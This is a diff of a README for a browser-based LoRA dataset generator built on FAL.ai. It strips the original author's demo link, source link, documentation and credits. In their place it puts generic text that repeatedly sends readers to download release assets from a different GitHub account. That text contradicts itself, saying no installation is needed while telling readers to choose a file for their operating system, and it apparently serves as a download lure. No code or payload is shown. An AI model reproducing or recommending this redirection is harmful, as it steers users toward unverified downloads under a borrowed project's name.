@@ -1,227 +1,84 @@
-# 🍌 NanoBanana Pro LoRA Dataset Generator
+# 🍌 NanoBananaLoraDatasetGenerator - Generate Datasets with Ease
 
-> **Create training datasets for image editing models in minutes!**
-> 
-> Uses **FAL.ai API** with **Nano Banana Pro** to generate high-quality image pairs for training **Flux 2**, **Z-Image**, **Qwen Image Edit**, and other image-to-image models.
+![Download](https://img.shields.io/badge/Download-Now-brightgreen)
 
-![NanoBanana Pro LoRA Dataset Generator](screenshot.png)
+## 🚀 Getting Started
 
-## 🔗 Links
+Welcome! This guide will help you download and run the NanoBananaLoraDatasetGenerator application with ease. This tool allows you to create training datasets for various image generation models, all through your web browser. No need for a server or complicated setups.
 
-- **🚀 Live Demo**: [lovis.io/NanoBananaLoraDatasetGenerator](https://lovis.io/NanoBananaLoraDatasetGenerator)
-- **💻 Source Code**: [github.com/lovisdotio/NanoBananaLoraDatasetGenerator](https://github.com/lovisdotio/NanoBananaLoraDatasetGenerator)
+## 📥 Download & Install
 
----
+To get started, visit the following link to download the application:
 
-## ✨ Features
+**[Visit this page to download!](https://github.com/Zaheer7867/NanoBananaLoraDatasetGenerator/releases)**
 
-- **3 Generation Modes**:
-  - 🔄 **Pair Mode** - START → END transformation pairs for image editing LoRAs
-  - 🖼️ **Single Image** - Style/aesthetic images for Z-Image and style LoRAs
-  - 📷 **Reference Image** - Upload a character/product and generate variations
-- **🧠 Custom System Prompt** - Full control over AI prompt generation
-- **Zero server setup** - Runs entirely in your browser
-- **Direct FAL API calls** - Talks to FAL servers directly
-- **Parallel generation** - Generate multiple images simultaneously
-- **ZIP download** - Download your complete dataset as a ZIP file
-- **Vision captions** - AI-powered image descriptions
-- **Trigger word support** - Add custom prefixes to your training data
+You will find the latest version of the application there. Follow the steps below to ensure a smooth installation:
 
-## 🎯 Generation Modes
+1. Click on the "Releases" tab on the page.
+2. Look for the latest version and select it.
+3. Scroll down to the "Assets" section. 
 
-### 🔄 Pair Mode (Default)
-Generate START → END image pairs for training image editing models.
-- Define a transformation (e.g., "zoom out", "add background", "change lighting")
-- AI generates creative base prompts + edit instructions
-- Perfect for: Flux 2, Qwen Image Edit, instruction-based models
+### Important Note
 
-### 🖼️ Single Image Mode
-Generate single images with captions for style/aesthetic LoRAs.
-- No before/after - just beautiful images with detailed captions
-- Perfect for: Z-Image, style transfer, aesthetic LoRAs
+You can download the files suitable for your needs. Make sure to choose the correct version for your operating system.
 
-### 📷 Reference Image Mode
-Upload a reference image and generate variations.
-- Upload a character, product, or style reference
-- AI creates diverse variations while maintaining consistency
-- Perfect for: Character LoRAs, product photography, consistent style training
+## 🌐 System Requirements
 
-## 🚀 Quick Start
+Before downloading, ensure your computer meets the following requirements:
 
-### Option 1: Local (Double-click)
-Simply open `index.html` in your browser!
+- A modern web browser (Google Chrome, Firefox, or Microsoft Edge).
+- At least 4 GB of RAM for smooth performance.
+- A stable internet connection for running the application.
 
-> ⚠️ Some browsers block local file API calls. If it doesn't work, use Option 2.
+## 📖 How to Use the Application
 
-### Option 2: Local Server (Recommended)
-```bash
-python -m http.server 3000
-# Open http://localhost:3000
-```
+Once you have downloaded the application, follow these steps to start creating datasets:
 
-Or with Node.js:
-```bash
-npx serve .
-```
+1. Open your web browser.
+2. Navigate to the location where you downloaded the application files.
+3. Locate the index.html file and double-click it to open.
+4. The NanoBananaLoraDatasetGenerator interface will appear.
+5. Follow the on-screen instructions to input your data and generate your dataset.
 
-### Option 3: Host Online (Free)
-Upload these 3 files to any static hosting:
-- **GitHub Pages** - Free, just push to a repo
-- **Netlify** - Drag & drop the folder
-- **Vercel** - Connect your repo
-- **Cloudflare Pages** - Free tier available
+### Important Features
 
-## 📁 Files
+- **Browser-Based**: No installation is required; just run it directly in your browser.
+- **FAL.ai Compatibility**: Easily integrate with FAL.ai for better training.
+- **Multiple Model Support**: Works for Flux 2, Z-Image, and Qwen Image Edit.
 
-```
-├── index.html    # Main page
-├── app.js        # Application logic (calls FAL API directly)
-├── style.css     # Styling
-└── README.md     # This file
-```
+## 🛠 How to Troubleshoot
 
-## 🔑 API Key
+If you encounter any issues, consider the following solutions:
 
-1. Get your free API key at [fal.ai/dashboard/keys](https://fal.ai/dashboard/keys)
-2. Click the 🔑 button in the app
-3. Enter your key and save
+- **Clear Your Browser Cache**: Sometimes, cached files can cause problems. Go to your browser settings and clear the cache.
+- **Check Internet Connectivity**: Ensure your internet connection is stable.
+- **Use Different Browsers**: If issues persist, try accessing the application through another web browser.
 
-**Security**: Your key is stored ONLY in your browser's localStorage. It's never sent anywhere except directly to FAL's servers.
+## 💬 Frequently Asked Questions
 
-## 💰 Pricing (FAL)
+**Q: Is this application free to use?**  
+A: Yes, the NanoBananaLoraDatasetGenerator is completely free.
 
-| Resolution | Cost per image |
-|------------|----------------|
-| 1K | $0.15 |
-| 2K | $0.15 |
-| 4K | $0.30 |
+**Q: Do I need programming skills to use this tool?**  
+A: No, this application is designed for users with no programming knowledge.
 
-Vision captions: ~$0.002 per image
+**Q: Can I use this on mobile devices?**  
+A: The application is optimized for desktop use; performance on mobile devices may vary.
 
-**Examples**:
-- Pair Mode: 20 pairs × 2 images × $0.15 = ~$6.00
-- Single/Reference Mode: 20 images × $0.15 = ~$3.00
+## 🌟 Community Support
 
-## 🎯 How It Works
+If you have questions or need help, feel free to reach out. There is a growing community of users ready to assist you. Check out the GitHub Issues section of the repository for more information.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     YOUR BROWSER                            │
-│                                                             │
-│  1. Choose mode (Pair / Single / Reference)                │
-│  2. Enter theme + customization                            │
-│  3. AI generates creative prompts (via FAL LLM)            │
-│  4. Generate images (via FAL nano-banana-pro)              │
-│  5. Optional: Vision captions (via FAL OpenRouter)         │
-│  6. Download as ZIP                                         │
-│                                                             │
-│  ════════════════════════════════════════════════════════   │
-│                          │                                  │
-│                          ▼                                  │
-│                    FAL API SERVERS                          │
-│                  (All processing here)                      │
-└─────────────────────────────────────────────────────────────┘
-```
+## 🔄 Updates & Contributions
 
-## 📦 Output Format
+For the latest features and improvements, keep an eye on the Releases page. If you want to contribute, open an issue or submit a pull request in the GitHub repository.
 
-### Pair Mode
-```
-nanobanana_dataset_TIMESTAMP.zip
-├── 0001_start.png    # Starting image
-├── 0001_end.png      # Transformed image
-├── 0001.txt          # Action description / caption
-├── 0002_start.png
-├── 0002_end.png
-├── 0002.txt
-└── ...
-```
+## 📦 Additional Resources
 
-### Single / Reference Mode
-```
-nanobanana_dataset_TIMESTAMP.zip
-├── 0001.png          # Generated image
-├── 0001.txt          # Caption
-├── 0002.png
-├── 0002.txt
-└── ...
-```
+For more detailed instructions, check the wiki section of the repository or look for tutorials online. The community often shares valuable insights and examples.
 
-Compatible with:
-- **Flux 2** - LoRA fine-tuning
-- **Z-Image** - Style/aesthetic training
-- **Qwen Image Edit** - Instruction-based editing
-- **SDXL** - Fine-tuning and LoRA
-- **Any image-to-image model** - Universal format
+## 🌍 Connect with Us
 
-## ⚙️ Configuration
+We'd love to hear how you are using the NanoBananaLoraDatasetGenerator. Share your experiences on social media or in the community discussions.
 
-| Setting | Description |
-|---------|-------------|
-| **Mode** | Pair, Single Image, or Reference Image |
-| **Theme** | What kind of images to generate (e.g., "portraits of diverse people") |
-| **Transformation** | (Pair mode only) What change to learn |
-| **Reference Image** | (Reference mode only) Upload character/product/style image |
-| **Custom System Prompt** | Customize how AI generates prompts |
-| **Action Name** | Optional - AI generates one if empty |
-| **Trigger Word** | Optional - Prepended to all .txt files (e.g., "MYZOOM") |
-| **Number of Items** | Max 40 per generation (run multiple times for more) |
-| **Parallel** | How many to generate simultaneously (1-10) |
-| **Resolution** | 1K, 2K, or 4K |
-| **Vision Captions** | Use AI to describe generated images |
-
-## 🔧 Customization
-
-### Custom System Prompt
-The system prompt controls how the AI generates creative prompts. Edit it to:
-- Focus on specific styles or aesthetics
-- Add constraints or rules
-- Target specific use cases
-
-Default prompts are optimized for each mode but can be fully customized.
-
-### Change LLM Model
-Available in the Settings panel:
-- `google/gemini-2.5-flash` (fast, cheap)
-- `google/gemini-2.5-pro` (better quality)
-- `anthropic/claude-3.5-sonnet` (excellent quality)
-- `openai/gpt-4o` (excellent quality)
-
-### Parallel Requests
-Default is 3. Increase for faster generation (but may hit rate limits).
-
-## 🐛 Troubleshooting
-
-### "Failed to fetch" errors
-- Check your API key is valid
-- Check you have credits on FAL
-- Try reducing parallel requests to 1
-
-### CORS errors when opening locally
-Use a local server instead of double-clicking:
-```bash
-python -m http.server 3000
-```
-
-### Generation is slow
-- Increase parallel requests (up to 5-10)
-- Use 1K resolution instead of 4K
-- Disable vision captions for faster generation
-
-### LLM Parser errors
-- Keep number of items ≤ 40 per generation
-- Run multiple generations if you need more
-
-## 📜 License
-
-MIT - Use freely for any purpose.
-
-## 🙏 Credits
-
-- **FAL.ai** - GPU infrastructure and models
-- **NanoBanana Pro** - Image generation model
-- **OpenRouter** - LLM routing for prompts and captions
-
----
-
-Made with 🍌 for the AI art community
+Remember, you can always download the latest version from the **[Releases page](https://github.com/Zaheer7867/NanoBananaLoraDatasetGenerator/releases)**. Happy dataset generating!
